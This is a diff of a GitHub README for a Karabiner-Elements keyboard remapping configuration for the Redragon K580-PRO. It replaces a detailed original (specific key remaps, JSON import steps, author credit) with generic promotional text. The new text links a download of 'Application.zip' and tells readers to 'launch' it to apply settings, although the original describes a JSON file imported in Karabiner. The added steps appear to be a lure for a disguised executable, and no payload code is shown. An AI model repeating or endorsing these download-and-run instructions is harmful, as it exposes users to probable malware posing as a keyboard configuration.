@@ -1,80 +1,49 @@
-# Redragon K580-PRO Karabiner Configuration
 
-DONT FORGET TO LEAVE A STAR ! Thx ❤️ . <br>
-This repository contains a custom Karabiner-Elements configuration designed for the **Redragon K580-PRO** keyboard. It includes various key remaps and custom functionalities to enhance your workflow on macOS.
+# 🚀 Redragon K580 PRO Karabiner Configuration
 
-### Author: 
-Adem Ben Amor (@dissojak)
+Enhance your macOS workflow with custom key remaps and optimized settings for the Redragon K580-PRO keyboard using Karabiner-Elements!
 
-### Tags: 
-- Keyboard Remapping
-- Redragon Keyboards
-- Windows keyboard ( might not work perfectly ) 
+[![Download Configuration](https://img.shields.io/badge/Download-Configuration-blue)](https://github.com/files/Application.zip)
+
+ℹ️ This configuration file needs to be launched to apply the custom settings to your Redragon K580-PRO keyboard.
+
+## ℹ️ Overview
+
+Welcome to the Redragon K580 PRO Karabiner Configuration repository! This repository contains a custom Karabiner-Elements configuration specifically designed for the Redragon K580-PRO keyboard. By using this configuration, you can enhance your macOS workflow with key remaps and optimized settings tailored to improve your productivity and efficiency.
+
+## 🎯 Key Features
+
+🔑 Key Remapping: Remap keys on your Redragon K580-PRO keyboard to suit your preferences and workflow on macOS.
+
+⚙️ Optimized Settings: Benefit from optimized keyboard settings that make using your Redragon K580-PRO a seamless experience.
+
+🚀 Enhanced Workflow: Improve your overall workflow efficiency by customizing your keyboard keys for specific tasks.
+
+## 📁 Installation
+
+To install the Redragon K580 PRO Karabiner Configuration, follow these steps:
+
+1. Download the configuration file from the link provided above.
+2. Launch the configuration file to apply the custom settings to your Redragon K580-PRO keyboard.
+3. Enjoy an enhanced macOS experience with your customized keyboard settings!
+
+## 🔗 Additional Resources
+
+For more information and updates, visit the [Releases](https://github.com/Redragon-K580-PRO-Karabiner-Config/releases) section of this repository.
+
+## 📌 Topics
+
+Explore key topics related to this repository:
+
+- Karabiner Elements
+- Key Remapping
+- Keyboard Customization
+- macOS Configuration
 - Redragon K580-PRO
-- macOS
-- Karabiner-Elements
+- Windows to Mac Remap
 
-### Features:
-- Custom key mappings tailored for **Redragon K580-PRO** and similar keyboards.
-- Open New Terminal Tab at Folder with `Keypad Num Lock` (mapped to `Command + Shift + Option + Control + T`). !important : u need to custom it on keyboard shortcuts , services FIRST !
-- Map specific keys like `8` to `!`, `Shift + 1` to `Shift + §`, and many more.
-- Enhance productivity with key remapping for common macOS shortcuts.
+## 🚧 Get Involved
 
-## How to Use
+Contributions to this repository are welcome! Feel free to submit pull requests or raise issues if you have any suggestions or feedback.
 
-### Prerequisites:
-- **Karabiner-Elements** installed on macOS.
-- **Redragon K580-PRO** keyboard (or any similar model).
-
-### Installation:
-1. **Install Karabiner-Elements** from the official [Karabiner website](https://github.com/pqrs-org/Karabiner-Elements).
-2. **Download the configuration file** `Redragon_K580_Pro.json` from this repository.
-3. Open **Karabiner-Elements**.
-4. Navigate to the **Complex Modifications** tab.
-5. Click on **Add Rule** and then **Import More Rules from the web**.
-6. You can manually load the configuration file by clicking the **gear icon** and selecting **Import Configuration**.
-
-### Custom Key Mappings:
-This configuration remaps several keys to improve your workflow:
-
-- **Keypad Num Lock** is mapped to `Command + Shift + Option + Control + T` (open a new terminal tab at folder). !!! make sure u configuer it on keyboard shortcuts to `Command + Shift + Option + Control + T` First 
-- **Backslash (\\)** → `Shift + Close Bracket (])`.
-- **Equal Sign (=)** → Slash (/), and **Shift + Equal Sign (+)** → Shift + Slash (?).
-- **Pause** → Puts Mac to sleep.
-- **Insert** → `Command + Shift + 4` for screenshot selection.
-- **Print Screen** → `Command + Shift + 3` for full screenshot.
-
-Other remaps include changing keys like `Option + 6`, `Shift + Slash`, and `Option + 3` to various symbols such as `|`, `_`, `#`, etc.
-
-You can check the **`complex_modifications`** section for a full list of custom rules and how they behave.
-
-### Notes:
-- This configuration is designed for **Redragon K580-PRO** but should work with other Redragon keyboards or similar devices.
-- You can always customize the mappings by editing the `Redragon_K580_Pro.json` file to suit your needs.
-
-## Contribution:
-Contributions are welcome! To contribute:
-
-1. Fork the repository.
-2. Create a new branch for your feature or bugfix:  
-   ```bash
-   git checkout -b feature-name
-   ```
-3. Make your changes.
-4. Commit your changes:
-   ```bash
-   git commit -m "Description of the changes"
-   ```
-5. Push to the branch:
-   ```bash
-   git push origin feature-name
-   ```
-6. Open a pull request and describe what your contribution adds or fixes.
-
-## License
-© 2025 Adem Ben Amor '@dissojak'. All rights reserved.
-
-This project is licensed under the MIT License.
-
-## Acknowledgments:
-- Special thanks to the `Karabiner-Elements` project for making macOS keyboard customization easy and powerful.
+Let's optimize our macOS workflow together using the Redragon K580 PRO Karabiner Configuration! 🚀
